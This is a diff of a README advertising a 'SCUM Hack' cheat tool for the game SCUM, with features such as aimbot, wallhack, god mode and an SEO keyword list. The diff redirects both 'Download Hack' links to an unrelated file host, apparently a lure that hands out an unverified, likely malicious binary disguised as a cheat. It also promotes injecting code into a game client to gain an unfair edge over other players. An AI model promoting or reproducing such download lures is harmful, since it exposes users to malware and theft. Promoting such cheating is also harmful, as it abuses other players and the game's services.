@@ -4,7 +4,7 @@ SCUM isn’t just another survival game — it’s a full-on simulation of hunge
 
 No more dying to puppets. No more getting sniped in bunkers. This hack gives you **total control**, from spawn to loot to PvP.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/scum/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload4.bitbucket.io)
 ---
 
 ## 🧠 What Is the SCUM Hack?
@@ -13,7 +13,7 @@ The **SCUM Hack** is an external/internal cheat tool injected into the game’s 
 
 Whether you're farming the world or wiping squads in PvP zones, this tool gives you the **unfair advantage** SCUM players only dream about.
 
-[![Download Hack](https://i.ytimg.com/vi/o8cUnxg8WtQ/maxresdefault.jpg)](https://wecheaters.github.io/cheats/scum/)
+[![Download Hack](https://i.ytimg.com/vi/o8cUnxg8WtQ/maxresdefault.jpg)](https://fileoffload4.bitbucket.io)
 ---
 
 ## 🔥 SCUM Hack Features
@@ -112,3 +112,4 @@ Why survive… when you can **dominate**? ⚔️🔥
 scum hack, scum cheat engine, scum esp, scum aimbot, scum god mode, teleport hack scum, scum no recoil, scum loot radar, scum wallhack, scum cheat menu, scum rage hack, scum infinite stamina, scum modded client, scum fly hack
 
 ---
+
